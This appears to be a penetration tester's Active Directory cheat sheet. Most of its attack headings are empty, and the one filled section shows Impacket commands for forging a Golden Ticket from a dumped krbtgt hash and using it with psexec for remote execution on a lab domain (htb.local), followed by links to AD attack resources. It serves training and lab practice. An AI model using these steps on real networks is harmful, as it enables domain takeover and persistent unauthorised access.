# Cheat Sheet

## AS-REP Roast

## Kerberoast

## Silver Ticket

## Golden Ticket

### From Linux

#### Impacket

After dumping the hashes, we will use the `krbtgt` user and hash that was found.

```bash
# From Target: Get Domain SID via PowerShell cmdlet
Get-ADDomain htb.local  # Look for DomainSID
# From Kali
python ticket.py <nt-hash> -domain-sid <DomainSID> -domain htb.local <fake-username>
export KRB5CCNAME=<fake-username>.cache
# Then use psexec
psexec.py htb.local/<fake-username>@<IP> -k -no-pass  # Using IP
psexec.py htb.local/<fake-username>@<DOMAIN> -k -no-pass  # May need to user domain
# DEBUG
## Redo steps replaceing <fake-username> with administrator
# Can also try wmiexec, smbexec
```

#### Mimikatz

## Resources

#### Mind Maps

AD - [https://www.xmind.net/m/5dypm8/](https://www.xmind.net/m/5dypm8/)

General Enumeration - [https://www.xmind.net/m/QsNUEz/](https://www.xmind.net/m/QsNUEz/)

#### WADComs

[https://wadcoms.github.io/](https://wadcoms.github.io/)

#### Methodology

[https://book.hacktricks.xyz/windows/active-directory-methodology](https://book.hacktricks.xyz/windows/active-directory-methodology)

[https://www.thehacker.recipes/](https://www.thehacker.recipes/)

[https://www.ired.team/](https://www.ired.team/)

#### Resources

[https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet)

[https://zer1t0.gitlab.io/posts/attacking\_ad/](https://zer1t0.gitlab.io/posts/attacking\_ad/)

[https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a)

[https://github.com/61106960/adPEAS](https://github.com/61106960/adPEAS)

#### Writeups

[https://infosecwriteups.com/active-directory-penetration-testing-cheatsheet-5f45aa5b44ff](https://infosecwriteups.com/active-directory-penetration-testing-cheatsheet-5f45aa5b44ff)

[https://n0h4ts.medium.com/passing-the-new-oscp-b9fcd434ade7](https://n0h4ts.medium.com/passing-the-new-oscp-b9fcd434ade7)
